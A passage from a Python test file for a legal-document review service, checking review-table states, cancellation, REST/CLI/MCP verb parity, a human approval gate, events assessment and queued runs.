    check(_st["by_state"]["PENDING"] == 0, "...no cell is left PENDING")
    check(_st["by_state"]["FAILED"] == 0,
          f"...and no cell FAILED: FAILED is transport only and nothing broke "
          f"({_st['by_state']})")
    _terminal = {"FOUND", "NOT_FOUND", "NEEDS_LAWYER"}
    _states = {c["state"] for c in _st["cells_detail"]}
    check(_states <= _terminal,
          f"**every cell ended FOUND / NOT_FOUND / NEEDS_LAWYER** ({sorted(_states)})")
    check(_st["findings"] == 6, f"...all six are findings ({_st['findings']})")
    _by = {(c["document_id"], c["column"]): c for c in _st["cells_detail"]}
    check(_by[("a" * 64, "governing law")]["state"] == "FOUND"
          and _by[("a" * 64, "governing law")]["value"] == "India",
          "the answer is right where the document answers it")
    check(_by[("a" * 64, "governing law")]["quote"] in _DOCS["a" * 64],
          "...and its quote byte-matches that document")
    check(_by[("c" * 64, "governing law")]["state"] == "NOT_FOUND",
          f"a document with no such clause is NOT_FOUND, not FAILED "
          f"({_by[('c' * 64, 'governing law')]['state']})")
    check(_by[("b" * 64, "term end")]["state"] == "NOT_FOUND",
          "...and a date column with no date is NOT_FOUND too")

    # .export gives a safe CSV.
    _ex2 = _eV["review_table.export"].run({"grid_id": _gid}, _e2e)
    _rows2 = [r for r in _csv2.reader(_io2.StringIO(_ex2["csv"]))]
    check(len(_rows2) == 4 and _rows2[0] == ["document", "governing law", "term end"],
          f"**.export gives a header and one row per document** ({len(_rows2) - 1} rows)")
    check(not [v for r in _rows2[1:] for v in r if not str(v).strip()],
          "...no cell is empty")
    check(not any(v.startswith(("=", "+", "@")) for r in _rows2 for v in r),
          "...and nothing in it can run as a formula")
    check("NOT FOUND" in _ex2["csv"] and "India" in _ex2["csv"],
          "...with findings and absences both legible")

    # A transport error is the ONLY way to FAILED.
    _ft = Context(store=_MB(), queue=_Q(), clock=lambda: "2026-10-01T10:00:00+05:30",
                  model_for=lambda _o: (lambda *_a: (_ for _ in ()).throw(
                      TimeoutError("the provider did not respond"))))
    _ft.documents.update(_e2e.documents)
    _fg = _eV["review_table.create"].run(
        {"name": "t", "document_ids": ["a" * 64],
         "columns": [{"name": "governing law", "kind": "text", "question": "Which law?"}]},
        _ft)["grid_id"]
    _fh = queue_handlers(_ft)
    _run_once(queue=_ft.queue, store=_ft.store, handlers=_fh, worker="w1")
    _fs = _eV["review_table.status"].run({"grid_id": _fg}, _ft)
    check(_fs["by_state"]["FAILED"] == 1 and _fs["findings"] == 0,
          f"an INJECTED transport error is the only route to FAILED, and it is not a "
          f"finding ({_fs['by_state']})")
    check("COULD NOT RUN" in _eV["review_table.export"].run({"grid_id": _fg},
                                                            _ft)["csv"],
          "...and it exports as COULD NOT RUN, never as NOT FOUND")

    # ══ cancel mid-run: nothing left running, no double execution ════════════
    _cc = Context(store=_MB(), queue=_Q(), clock=lambda: "2026-10-01T10:00:00+05:30",
                  model_for=_answerer)
    _cc.documents.update(_e2e.documents)
    _cg = _eV["review_table.create"].run(
        {"name": "cancel me", "document_ids": list(_DOCS),
         "columns": [{"name": "governing law", "kind": "text", "question":
                      "Which law governs this agreement?"}]}, _cc)["grid_id"]
    _ch = queue_handlers(_cc)
    _run_once(queue=_cc.queue, store=_cc.store, handlers=_ch, worker="w1")   # 1 of 3
    _mid = _eV["review_table.status"].run({"grid_id": _cg}, _cc)
    check(_mid["findings"] == 1 and _mid["by_state"]["PENDING"] == 2,
          f"one cell is answered and two are still PENDING ({_mid['by_state']})")

    _can = _eV["review_table.cancel"].run({"grid_id": _cg}, _cc)
    check(_can["cancelled"] and _can["findings_kept"] == 1
          and _can["pending_stopped"] == 2,
          f"cancel KEEPS the answer and stops the rest ({_can['findings_kept']} kept, "
          f"{_can['pending_stopped']} stopped)")
    _after = _eV["review_table.status"].run({"grid_id": _cg}, _cc)
    check(_after["findings"] == 1,
          "**the answered cell survives the cancel** -- a lawyer who cancels at cell 1 of "
          "3 still wants the 1")
    check(_after["by_state"]["PENDING"] == 2 and _after["by_state"]["FAILED"] == 0,
          f"...and the unrun cells stay PENDING, NOT FAILED: nothing went wrong "
          f"({_after['by_state']})")
    check(_after["cancelled"], "...and the table reports itself cancelled")
    check(not _eV["review_table.create"].run(
              {"name": "x", "document_ids": list(_DOCS),
               "columns": [{"name": "governing law", "kind": "text",
                            "question": "Which law governs this agreement?"}],
               "grid_id": _cg}, _cc).get("scheduled", {}).get("enqueued"),
          "re-creating a cancelled grid schedules NOTHING new: every cell is either "
          "answered or already queued, so the two exactly-once guards hold")

    # No double execution: drain whatever is left and assert the answered cell is
    # unchanged and each cell was written at most once.
    _before_val = _after["cells_detail"]
    for _ in range(10):
        if _run_once(queue=_cc.queue, store=_cc.store, handlers=_ch, worker="w2") is None:
            break
    _end = _eV["review_table.status"].run({"grid_id": _cg}, _cc)
    _first = {(c["document_id"], c["column"]): c["value"]
              for c in _before_val if c["state"] == "FOUND"}
    _last = {(c["document_id"], c["column"]): c["value"]
             for c in _end["cells_detail"] if c["state"] == "FOUND"}
    check(all(_last.get(k) == v for k, v in _first.items()),
          "**no double execution**: a cell answered before the cancel holds exactly the "
          "value it held, after every remaining job has been drained")
    check(_end["cells"] == 3, "...and the grid is still three cells, not six")

    # ── PARITY, the point of the file ───────────────────────────────────────
    check(set(rest) == names and set(cli) == names,
          f"REST and CLI expose every verb (rest {sorted(set(rest) ^ names)}, "
          f"cli {sorted(set(cli) ^ names)})")
    mcp_names = {t.name for t in mcp}
    expected_mcp = {mcp_name(v) for v in VERBS if v.read_only}
    check(mcp_names == expected_mcp,
          f"MCP exposes every READ-ONLY verb and no other ({sorted(mcp_names)})")
    check({n.split(".", 1)[1] for n in mcp_names} == names - set(write_verbs()),
          "...and the gap between MCP and the others is EXACTLY the write verbs, which is "
          "checker/mcp/policy.py's rule and not an oversight")

    # Parity against the REAL surface, not only against what this module generates:
    # themis.ask already existed (the /v1 engine ask, wired before the agent runtime) and
    # is not replaced, so the question is whether every read-only verb has SOME tool --
    # not whether this module produced it.
    from checker.mcp.tools import TOOLS as LIVE_TOOLS
    live = {t.name for t in LIVE_TOOLS}
    absent = [mcp_name(v) for v in VERBS if v.read_only and mcp_name(v) not in live]
    check(not absent, f"every read-only verb has a tool on the live MCP surface ({absent})")
    check(mcp_name(by_name()["ask"]) in live,
          "...themis.ask among them, served by the tool that already existed rather than "
          "by quietly swapping what a published tool does")
    check(all(mcp_name(by_name()[w]) not in live for w in write_verbs()),
          f"...and no WRITE verb reached it ({write_verbs()})")

    drift = []
    for v in VERBS:
        want = v.signature
        cli_sig = tuple(sorted((f.lstrip("-").replace("-", "_"), req)
                               for f, req in cli[v.name]["flags"].items()))
        rest_sig = tuple(sorted(
            (n, n in rest[v.name]["required"])
            for n in rest[v.name]["body"] + rest[v.name]["path_params"]))
        if cli_sig != want or rest_sig != want:
            drift.append((v.name, want, rest_sig, cli_sig))
    check(not drift, f"every surface takes the SAME inputs with the same required flags "
                     f"({drift[:2]})")

    for t in mcp:
        v = by_name()[t.name.split(".", 1)[1]]
        got = tuple(sorted((n, n in set(t.schema["required"]))
                           for n in t.schema["properties"]))
        check(got == v.signature,
              f"{t.name} takes the same inputs as its verb")

    # ── the mutation: a new verb must show up in all three, or this is theatre ─
    probe = Verb("widgets.count", "how many widgets",
                 (Field("since", STRING, True),), "GET", read_only=True)
    w = Verb("widgets.delete", "remove one", (Field("id", STRING, True),),
             "POST", read_only=False)
    hypo = VERBS + (probe, w)
    check("widgets.count" in rest_spec(hypo) and "widgets.count" in cli_spec(hypo)
          and f"{MCP_NAMESPACE}.widgets.count" in {t.name for t in mcp_tools(hypo)},
          "a verb added to the table appears in ALL THREE surfaces without another edit -- "
          "so drift needs someone to edit this file, which is the point")
    check(f"{MCP_NAMESPACE}.widgets.delete" not in {t.name for t in mcp_tools(hypo)},
          "...while a WRITE verb is kept out of MCP by mcp_tools(), not by the author "
          "remembering to")
    check("widgets.delete" in write_verbs(hypo), "...and is named in write_verbs()")
    check(len(VERBS) == 29 and "widgets.count" not in rest_spec(),
          "...and the probe changed nothing in this module: the surfaces are generated "
          "from an argument, not from a global the test rebound")

    # ── paths ───────────────────────────────────────────────────────────────
    paths = {v: rest[v]["path"] for v in rest}
    check(len(set(paths.values())) == len(paths), f"every REST path is distinct ({paths})")
    check(paths["runs.get"] == "/v2/runs/{run_id}"
          and paths["runs.trace"] == "/v2/runs/{run_id}/trace",
          f"a dotted verb becomes a nested path ({paths['runs.trace']})")
    check(paths["ask"] == "/v2/ask" and paths["review_contract"] == "/v2/review-contract",
          f"an underscore becomes a hyphen in a URL ({paths['review_contract']})")
    for v in VERBS:
        for f in v.path_fields:
            check("{" + f.name + "}" in paths[v.name],
                  f"{v.name}: the path field {f.name} is IN the path, not the body")
    check(all(p.startswith(V2) for p in paths.values()),
          "...and every generated route is under /v2, so /v1 cannot be shadowed")

    try:
        Field("x", STRING, required=False, in_path=True)
        check(False, "an optional path field is refused")
    except ValueError:
        check(True, "an optional path field is refused at construction: a URL either has "
                    "that segment or it is a different route")

    # ── the handlers, offline ───────────────────────────────────────────────
    ctx = Context()
    check(_ask({}, ctx)["code"] == "BAD_REQUEST", "ask without a question is refused")
    check(_review_contract({"text": " "}, ctx)["code"] == "BAD_REQUEST",
          "review_contract without text is refused")
    check(_runs_get({"run_id": "r1"}, Context())["code"] == "NO_STORE",
          "a run lookup with no store says NO_STORE, not NOT_FOUND -- those are different "
          "facts and only one of them is about the run")

    class _S:
        def read(self, rid):
            return {"id": "r1", "status": "ANSWERED",
                    "steps": [{"capability": "intake"}]} if rid == "r1" else None
    s = Context(store=_S())
    check(_runs_get({"run_id": "nope"}, s)["code"] == "NOT_FOUND",
          "...and NOT_FOUND when the store is there and the run is not")
    check("steps" not in _runs_get({"run_id": "r1"}, s),
          "runs.get omits the steps -- runs.trace is the verb that serves them")
    check(_runs_trace({"run_id": "r1"}, s)["steps"] == [{"capability": "intake"}],
          "runs.trace serves them, in order, as persisted")

    d = Context()
    up = _documents_upload({"text": "a contract"}, d)
    again = _documents_upload({"text": "a contract"}, d)
    check(up["document_id"] == again["document_id"] and len(d.documents) == 1,
          "a document is identified BY its sha256, so uploading it twice is one document")
    check("survive a restart" in up["note"] or "survives a restart" in up["note"],
          "...and the reply says the store is memory and what that costs")
    check(_documents_upload({"text": ""}, d)["code"] == "BAD_REQUEST",
          "an empty upload is refused rather than stored as a document of nothing")

    # ── review_document: classify first, and a notice is not minutes ────────
    from gateway.store import MemoryBackend as _MB
    from checker.ss import defects as _ss
    _NOTICE = ("NOTICE OF THE 14th ANNUAL GENERAL MEETING\n\nNotice is hereby given that "
               "the meeting will be held on 30 September 2026. An explanatory statement is "
               "annexed and a proxy form is enclosed. E-voting will be available.\n")
    rd_ctx = Context(store=_MB())
    rdoc = _review_document({"text": _ss.CLEAN, "meeting_date": "2026-04-01",
                             "entry_date": "2026-04-20"}, rd_ctx)
    check(rdoc["doc_type"] == "minutes" and rdoc["status"] == "ANSWERED",
          f"review_document classifies the specimen as minutes ({rdoc['doc_type']})")
    check(rdoc.get("run_id"), "...and returns the id of the run it wrote")
    check(all(f["rule_id"] and f["source"] and f["quoted_span"] for f in rdoc["findings"]),
          "...every finding carrying a rule id, a source and a quoted span (PLAN_23 O1)")
    check(any(f["needs_human"] for f in rdoc["findings"]),
          "...and the physical-book items are flagged for a person, not guessed at")

    notice = _review_document({"text": _NOTICE}, Context(store=_MB()))
    minutes_only = {c for c, a in _ss.APPLICABILITY.items() if a == frozenset({"minutes"})}
    fired = [f["rule_id"] for f in notice["findings"]
             if f["rule_id"] in minutes_only and f["status"] == "DEFECT"]
    check(notice["doc_type"] == "notice" and not fired,
          f"NO minutes check reports a defect on a notice {fired} -- the failure mode that "
          f"produced 80-93% false positives against compliant filings")

    unknown = _review_document({"text": "Dear Sir, please find the cheque enclosed. "
                                        "Kindly acknowledge receipt."}, Context(store=_MB()))
    check(unknown["status"] == "UNCLASSIFIED" and unknown["code"] == "CLASSIFICATION_UNCERTAIN",
          f"an unidentifiable document is classification UNCERTAINTY ({unknown['status']})")
    check(unknown["findings"] == [] and unknown["requires_review"],
          "...with no findings at all, and still requiring review: 0 defects about a "
          "document nobody identified must not read as a clean bill")
    check(_review_document({"text": " "}, Context())["code"] == "BAD_REQUEST",
          "review_document without text is refused")
    check(_review_document({"text": _ss.CLEAN, "meeting_date": "1 April 2026"},
                           Context())["code"] == "BAD_REQUEST",
          "...and an unreadable date is refused rather than silently treated as absent")

    # ── the human gate: runs.approve / runs.reject ──────────────────────────
    dstore = _MB()
    dctx = Context(store=dstore, actor="00000000-0000-0000-0000-0000000000a1")
    drun = _review_document({"text": _ss.CLEAN}, dctx)
    rid, item = drun["run_id"], "ss:T1.2"
    good = {"run_id": rid, "item_ref": item,
            "reason": "Inspected the book; the Chairman initialled every page.",
            "quoted_span": "physical minutes book not inspected", "quote_viewed": True}

    # PLAN_23 §1.8: the quote is viewed before a finding is ACCEPTED.
    for unseen, how in (({k: v for k, v in good.items() if k != "quote_viewed"}, "absent"),
                        ({**good, "quote_viewed": False}, "false"),
                        ({**good, "quote_viewed": "false"}, "the STRING 'false'"),
                        ({**good, "quote_viewed": "no"}, "'no'")):
        check(_runs_approve(unseen, dctx).get("code") == "QUOTE_NOT_VIEWED",
              f"an approval with quote_viewed {how} is REFUSED -- a click without the quote "
              f"would be stored as a person's agreement")
    check(dstore.read_decisions(rid) == [],
          "...and none of those refusals wrote a label")
    drun_run = dstore.read_run(rid)
    check(drun_run["law_versions"] == law_versions_of(SS_TEXTS)
          and all(len(b) == 40 for b in drun_run["law_versions"].values()),
          f"a review_document run records the SS-1/SS-2 texts it applied, as git blob ids "
          f"({sorted(drun_run['law_versions'] or {})})")

    check(_runs_approve({**good, "reason": "ok"}, dctx)["code"] == "REASON_REQUIRED",
          "a one-word reason is REFUSED: a decision with no reason records that somebody "
          "clicked, which is the automation bias the gate exists to prevent")
    check(_runs_approve({**good, "quoted_span": ""}, dctx)["code"] == "QUOTE_REQUIRED",
          "...and a decision with no quoted span is refused: the label would be attached "
          "to nothing a person can be shown to have read")
    check(_runs_approve({**good, "item_ref": "ss:T9.9"}, dctx)["code"] == "NOT_FOUND",
          "...and an item the run never served is refused: it would be a label about nothing")
    check(_runs_approve({**good, "run_id": "no-such-run"}, dctx)["code"] == "NOT_FOUND",
          "...and so is an unknown run")
    check(_runs_approve(good, Context(actor="a"))["code"] == "NO_STORE",
          "...and with no store the decision is REFUSED, not accepted and dropped: a human "
          "decision that is not stored is one that was not made")

    rec = _runs_approve(good, dctx)
    check(rec["status"] == "RECORDED" and rec["decision"] == "APPROVED",
          f"a reasoned approval is recorded ({rec.get('status')})")
    check(rec["actor_id"] == "00000000-0000-0000-0000-0000000000a1" and rec["decided_at"],
          "...with the actor who made it and the time they made it")
    check(rec["reason"] == good["reason"] and rec["quoted_span"] == good["quoted_span"],
          "...and the reason and the span they were shown, verbatim: that IS the label")
    check(rec["quote_viewed"] is True,
          "...and that the quote was viewed")
    check(rec["law_versions"] == drun_run["law_versions"],
          "...and the law versions the finding was computed against, copied from the run")
    again = _runs_approve({**good, "reason": "Actually I changed my mind about this."}, dctx)
    check(again["code"] == "ALREADY_DECIDED",
          "...and a second decision on the same item is refused rather than overwriting the "
          "label that is the point of storing it")
    rej = _runs_reject({**good, "item_ref": "ss:T1.3",
                        "reason": "Blank pages were not scored out; the book shows three."},
                       dctx)
    check(rej["decision"] == "REJECTED" and len(dstore.read_decisions(rid)) == 2,
          "...while a rejection on a different item is a separate label")
    rej2 = _runs_reject({k: v for k, v in good.items() if k != "quote_viewed"}
                        | {"item_ref": "ss:T1.4a",
                           "reason": "Signed after the thirty-day window, per the book.",
                           "law_versions": {"corpus/reference/SS-1.txt": "f" * 40}}, dctx)
    check(rej2.get("status") == "RECORDED" and rej2["quote_viewed"] is False,
          f"a REJECTION without the quote is recorded, as not viewed: it withholds a "
          f"finding rather than clearing one ({rej2.get('status')}/{rej2.get('code')})")
    check(rej2.get("law_versions") == drun_run["law_versions"],
          "...and law_versions supplied by the CALLER are ignored: a reviewer cannot know "
          "what a run read, and a label must not be filed against versions it never saw")

    # NOT MCP. A tool surface that can approve a finding is one that can clear a review.
    mcp_names = {t.name for t in mcp_tools()}
    check(not {n for n in mcp_names if "approve" in n or "reject" in n},
          f"runs.approve and runs.reject are NOT exposed over MCP {sorted(mcp_names)}")
    check("runs.approve" in rest_spec() and "runs-approve" in
          {c["command"] for c in cli_spec().values()},
          "...while REST and the CLI both carry them, which is where a person acts")

    # ── events.assess, on all THREE generated surfaces ──────────────────────
    from checker import events as _events

    ea = _events_assess({"event": "share_allotment",
                         "facts": {"foreign_investor": True}}, Context())
    check(ea["status"] == "PARTIAL",
          f"events.assess on a foreign-investor allotment is PARTIAL ({ea['status']})")
    bodies = {f["body_id"]: f for f in ea["findings"]}
    check("FEMA1999" in bodies and bodies["FEMA1999"]["handling"] == "REFUSED",
          f"...engaging FEMA1999 with its named refusal {sorted(bodies)}")
    check("Foreign Exchange Management Act" in bodies["FEMA1999"]["text"],
          "...whose text names the body, so a reader sees what is not held")
    check(bodies["CA2013"]["body_status"] == "IN_CORPUS",
          "...and the held body carries its status from the register")
    check(all(f["text"].strip() for f in ea["findings"]),
          "...every engaged body says SOMETHING: silence would read as no obligation found")
    check("not been reviewed by a lawyer" in ea["note"],
          "...and the reply says the table is not lawyer-reviewed")
    stamp = _events_assess({"event": "commercial_contract"}, Context())
    st = {f["body_id"]: f for f in stamp["findings"]}["STAMP"]
    check(st["handling"] == "UNCLASSIFIED",
          f"stamp duty with no State is UNCLASSIFIED, not a guess ({st['handling']})")

    check(_events_assess({"event": ""}, Context())["code"] == "BAD_REQUEST",
          "a missing event is refused, naming the ones that exist")
    check(_events_assess({"event": "no_such_event"}, Context())["code"] == "BAD_REQUEST",
          "...as is an undeclared event")
    check(_events_assess({"event": "share_allotment", "facts": {"colour": "red"}},
                         Context())["code"] == "BAD_REQUEST",
          "...and a fact this table does not read is REFUSED, not ignored: a fact silently "
          "dropped reads as one that was taken into account")
    check(_events_assess({"event": "share_allotment", "facts": "listed"},
                         Context())["code"] == "BAD_REQUEST",
          "...and facts must be an object")

    # REST
    check(rest_spec()["events.assess"]["method"] == "POST"
          and rest_spec()["events.assess"]["path"] == "/v2/events/assess",
          f"REST exposes it at {rest_spec()['events.assess']['path']}")
    check(rest_spec()["events.assess"]["required"] == ("event",),
          f"...with `event` required and `facts` optional "
          f"({rest_spec()['events.assess']['required']})")
    # MCP -- it is READ-ONLY, so unlike runs.approve it belongs here.
    mcp_names = {t.name for t in mcp_tools()}
    check(f"{MCP_NAMESPACE}.events.assess" in mcp_names,
          f"MCP carries it, because it is read-only and calls no model {sorted(mcp_names)}")
    check("events.assess" not in write_verbs(),
          "...and it is not a write verb, which is WHY it may appear there")
    # CLI
    check(cli_spec()["events.assess"]["command"] == "events-assess",
          f"the CLI command is {cli_spec()['events.assess']['command']}")
    # ── company facts at the VERB boundary (PLAN_26 S2-alt) ─────────────────
    # The module tests prove the rules; these prove the wiring, which is where the
    # user-facing guarantee actually lives.
    from checker.sources import mca_fixture as _fx
    _ctx = Context()
    _un = [{"field": "state", "value": "Maharashtra"}, {"field": "listed", "value": "yes"}]
    _r = by_name()["events.assess"].run(
        {"event": "commercial_contract", "company_facts": _un}, _ctx)
    check(_r["company_facts"]["used"] == []
          and len(_r["company_facts"]["pending_confirmation"]) == 2,
          "events.assess uses NO unconfirmed company fact, and reports both as pending")
    _stamp = [f for f in _r["findings"] if f["body_id"] == "STAMP"]
    check(_stamp and _stamp[0]["handling"] == "UNCLASSIFIED",
          "...so STAMP stays UNCLASSIFIED: an unconfirmed State does not pick a regime")
    _r2 = by_name()["events.assess"].run(
        {"event": "commercial_contract",
         "company_facts": [dict(x, confirmed=True) for x in _un]}, _ctx)
    check([f["field"] for f in _r2["company_facts"]["used"]] == ["listed", "state"]
          or sorted(f["field"] for f in _r2["company_facts"]["used"]) == ["listed", "state"],
          "...and once CONFIRMED both are used")
    _stamp2 = [f for f in _r2["findings"] if f["body_id"] == "STAMP"]
    check(_stamp2 and _stamp2[0]["handling"] != "UNCLASSIFIED",
          f"...which moves STAMP off UNCLASSIFIED ({_stamp2[0]['handling']}) -- the "
          f"confirmation is doing visible work, not decorating a payload")
    _r3 = by_name()["events.assess"].run(
        {"event": "commercial_contract", "facts": {"state": "Kerala"},
         "company_facts": [dict(x, confirmed=True) for x in _un]}, _ctx)
    check(_r3["status"] == "REFUSED" and "not ours to choose" in _r3["detail"],
          "a State given twice, differently, is REFUSED rather than resolved by precedence")
    _bad = by_name()["events.assess"].run(
        {"event": "commercial_contract",
         "company_facts": [{"field": "director_name", "value": "X"}]}, _ctx)
    check(_bad["status"] == "REFUSED" and "personal data" in _bad["detail"],
          "a director_name company fact is REFUSED at the verb")

    _x = by_name()["company_facts.extract"].run(
        {"text": _fx.master_data_text(), "uploaded_on": "2026-10-01"}, _ctx)
    check(len(_x["facts"]) == 8 and _x["tier"] == "CLIENT" and _x["confirm_required"],
          f"company_facts.extract returns 8 unconfirmed CLIENT-tier facts "
          f"({len(_x['facts'])})")
    check(all(f["quoted_span"] and not f["confirmed"] and not f["can_verify"]
              for f in _x["facts"]),
          "...each with a span, unconfirmed, and never verifiable")
    _blob = repr(_x)
    check(all(d not in _blob and n not in _blob
              for d, n in _fx.SYNTHETIC_DIRECTORS),
          "...and no director name or DIN in the payload")
    check(by_name()["company_facts.extract"].run(
              {"text": "", "uploaded_on": "2026-10-01"}, _ctx)["code"] == "CANNOT_READ",
          "an upload with no text is CANNOT_READ, never an empty set of facts")
    check(by_name()["company_facts.extract"].run(
              {"text": "Company Master Data\nCIN  U00000ZZ0000ZZZ000000",
               "uploaded_on": ""}, _ctx)["status"] == "REFUSED",
          "...and an extract with no upload date is refused: the label names the date")
    check("company_facts.extract" not in write_verbs(),
          "company_facts.extract does not write: it parses and returns, and a TOOL may "
          "never confirm a fact -- confirmation is a person's act, and it arrives as an "
          "argument")

    check(cli_spec()["events.assess"]["flags"] == {"--event": True, "--facts": False,
                                                   "--company-facts": False},
          f"...with the same fields as the other two surfaces "
          f"({cli_spec()['events.assess']['flags']})")
    check(len(_events.BY_KEY) == 8,
          f"...covering the eight events the table declares ({len(_events.BY_KEY)})")

    # ── the durable path, end to end (PLAN_23 O2) ───────────────────────────
    from gateway.jobs import MemoryQueue as _MQ
    from gateway.store import MemoryBackend as _MB2
    from gateway.worker import drain as _drain
    from checker.ss import defects as _ss2

    qstore, qq = _MB2(), _MQ()
    qctx = Context(store=qstore, queue=qq)
    sub = _runs_submit({"intent": "review_document",
                        "args": {"text": _ss2.CLEAN, "meeting_date": "2026-05-12",
                                 "entry_date": "2026-06-30"}}, qctx)
    check(sub["status"] == "PLANNED" and sub.get("run_id"),
          f"runs.submit returns a run id IMMEDIATELY, with status PLANNED "
          f"({sub.get('status')}) -- the answer arrives later")
    rid = sub["run_id"]
    check(_runs_get({"run_id": rid}, qctx)["status"] == "PLANNED",
          "...and the run is readable straight away, before any worker has touched it")
    check(qstore.read_run(rid)["steps"] == [],
          "...with no steps yet: nothing was executed inside the request")
    check(qq.depth() == 1, f"...and exactly one job is queued ({qq.depth()})")

    outs = _drain(queue=qq, store=qstore, handlers=queue_handlers(qctx))
    check(len(outs) == 1 and outs[0].status == "ANSWERED",
          f"a worker takes it to a terminal status ({outs and outs[0].status})")
    done = _runs_get({"run_id": rid}, qctx)
    check(done["status"] == "ANSWERED", "...and runs.get now serves the final status")
    trace_q = _runs_trace({"run_id": rid}, qctx)["steps"]
    check([st["capability"] for st in trace_q] == ["intake", "document", "verify"],
          f"...and the trace is the plan agents/plans.py declares "
          f"({[st['capability'] for st in trace_q]})")
    check(all(st.get("idempotency_key") for st in trace_q),
          "...every step carrying the key that makes a retry a no-op")

    # The queue path and the request path are the SAME handler, so they must agree.
    direct = _review_document({"text": _ss2.CLEAN, "meeting_date": "2026-05-12",
                               "entry_date": "2026-06-30"}, Context())
    stored = qstore.read_run(rid)["result"]
    check(stored and stored["doc_type"] == direct["doc_type"]
          and stored["defect_count"] == direct["defect_count"],
          "the queued run and the synchronous verb give the SAME answer -- they are one "
          "handler, called twice, not two implementations")

    # Submitting the same work twice is two runs; a second JOB for one run is refused.
    again = _runs_submit({"intent": "review_document", "args": {"text": _ss2.CLEAN}}, qctx)
    check(again["run_id"] != rid, "a second submission is a second run, with its own id")
    check(_runs_submit({"intent": "nonsense", "args": {}}, qctx)["code"] == "BAD_REQUEST",
          "an undeclared intent is refused rather than queued to fail later")
    check(_runs_submit({"intent": "review_document"}, Context())["code"] == "NO_STORE",
          "...and with no durable queue, submit REFUSES rather than accepting work it "
          "cannot keep")

    # ── cancel: a request, honoured at a boundary ───────────────────────────
    cq, cs = _MQ(), _MB2()
    cctx = Context(store=cs, queue=cq)
    csub = _runs_submit({"intent": "review_document", "args": {"text": _ss2.CLEAN}}, cctx)
    crid = csub["run_id"]
    cancelled = _runs_cancel({"run_id": crid}, cctx)
    check(cancelled["status"] == "CANCEL_REQUESTED",
          f"runs.cancel is accepted on a queued run ({cancelled.get('status')})")
    _drain(queue=cq, store=cs, handlers=queue_handlers(cctx))
    crow = _runs_get({"run_id": crid}, cctx)
    check(crow["status"] == "REFUSED" and crow["refusal_code"] == "CANCELLED",
          f"...and the run ends REFUSED / CANCELLED ({crow.get('status')}/"
          f"{crow.get('refusal_code')}) -- a person decided this, so it is not FAILED")
    ctrace = _runs_trace({"run_id": crid}, cctx)["steps"]
    check(ctrace and any(st["status"] == "CANCELLED" for st in ctrace),
          f"...with a CANCELLED step saying where it stopped "
          f"({[st['status'] for st in ctrace]})")
    check(_runs_cancel({"run_id": crid}, cctx)["code"] == "NOT_CANCELLABLE",
          "...and cancelling it again is refused: a finished run is not cancelled "
          "retroactively, because its trace is what happened")
    check(_runs_cancel({"run_id": str(__import__("uuid").uuid4())}, cctx)["code"]
          == "NOT_CANCELLABLE",
          "...and an unknown run gets the SAME answer, so the code does not leak which "
          "run ids exist")
    check(_runs_cancel({"run_id": "x"}, Context())["code"] == "NO_STORE",
          "...while with no queue at all it says so rather than claiming to have cancelled")

    # ── a verb that answers leaves a TRACE, which is what runs.trace serves ──
    from gateway.store import MemoryBackend
    from agents import review_contract as _rc
    st = MemoryBackend()
    fx = _rc.fixtures()[0]
    # A model is INJECTED for every check below. The gate must reach no network: a suite
    # that calls Azure is a suite that fails on a plane and bills a student account.
    c2 = Context(store=st, model_for=lambda origins: _rc.fixture_model(fx))
    out = _review_contract({"text": fx.text, "name": fx.id, "test_data": True}, c2)
    check(out.get("run_id"), "review_contract returns the id of the run it wrote")
    _a = _ask({"question": "how many meetings of the Board must a company hold"},
              Context(store=MemoryBackend(),
                      model_for=lambda origins: (lambda prompt: "")))
    check("answer" in _a,
          "ask returns the ANSWER as well as the verdict -- to_dict() carries provisions "
          "and a status, and a verb that returned everything about an answer except the "
          "answer is not serving one")
    trace = _runs_trace({"run_id": out["run_id"]}, c2)
    check([s["capability"] for s in trace["steps"]]
          == ["intake", "document", "playbook"],
          f"...and runs.trace serves its steps, in the order agents/plans.py declares "
          f"({[s['capability'] for s in trace['steps']]})")
    row = _runs_get({"run_id": out["run_id"]}, c2)
    check(row["intent"] == "review_contract" and row["status"] == "ANSWERED",
          "...and runs.get serves the run itself")
    stored = st.read_run(out["run_id"])
    check(len(stored["propositions"]) == len(out["findings"]),
          f"one proposition per finding ({len(stored['propositions'])} for "
          f"{len(out['findings'])} findings)")
    # With no model nothing is extracted, so every finding is MISSING -- and NOTHING may
    # be recorded as VERIFIED. Derived by subtraction, the first version recorded all ten.
    # "Nothing extracted" is now a MODEL that finds nothing, not the absence of one:
    # the verbs serve a real route today, so absence of a model is a refusal instead.
    nomodel = Context(store=MemoryBackend(),
                      model_for=lambda origins: (lambda prompt: "{}"))
    o_nm = _review_contract({"text": fx.text, "name": fx.id, "test_data": True},
                            nomodel)
    st_nm = nomodel.store.read_run(o_nm["run_id"])
    check({f["status"] for f in o_nm["findings"]} == {"MISSING", "MATCHES"},
          f"a model that extracts NOTHING leaves every finding MISSING, "
          f"except the must_be_absent rules, which MATCH on absence "
          f"({sorted({f['status'] for f in o_nm['findings']})})")
    check({p["status"] for p in st_nm["propositions"]} == {"UNVERIFIED"},
          f"...and NOT ONE proposition is VERIFIED "
          f"({sorted({p['status'] for p in st_nm['propositions']})}): a clause that was "
          f"never extracted cannot have been verified")
    check({p["status"] for p in stored["propositions"]} <= {"VERIFIED", "UNVERIFIED"},
          "...carrying an L0 verification status, never a playbook status: writing "
          "DEVIATES into a column that means VERIFIED would put a company standard where "
          "a legal verdict is read from")
    check(all(p["source_ref"].startswith("playbook:") for p in stored["propositions"]),
          "...and naming the rule it came from")
    check(_review_contract({"text": fx.text, "test_data": True},
                           Context(model_for=lambda o: _rc.fixture_model(fx))
                           ).get("run_id") is None,
          "with NO store the verb still answers, and says the run id is None rather than "
          "handing back one that resolves to nothing")

    # ── PLAN_22 D3: a real client contract may not go to an unconfirmed region ──
    import os as _os
    from checker.azure_model import ACCEPT_REGION_ENV, DEPLOYMENT_REGION
    held = _os.environ.pop(ACCEPT_REGION_ENV, None)
    try:
        real = _review_contract(
            {"text": fx.text, "name": "acme-real.docx"},
            Context(store=MemoryBackend()))
        check(real.get("status") in ("FAILED", "REFUSED"),
              f"a contract NOT marked test data does not produce findings "
              f"({real.get('status')})")
        check("findings" not in real,
              "...and no findings are served from a document that was never sent")
        check(DEPLOYMENT_REGION in str(real),
              f"...the reason naming the region ({DEPLOYMENT_REGION}), so a reader knows "
              f"it is a residency decision and not an outage")
    finally:
        if held is not None:
            _os.environ[ACCEPT_REGION_ENV] = held

    print(f"\n{ok}/{ok + fail} passed")
    if fail:
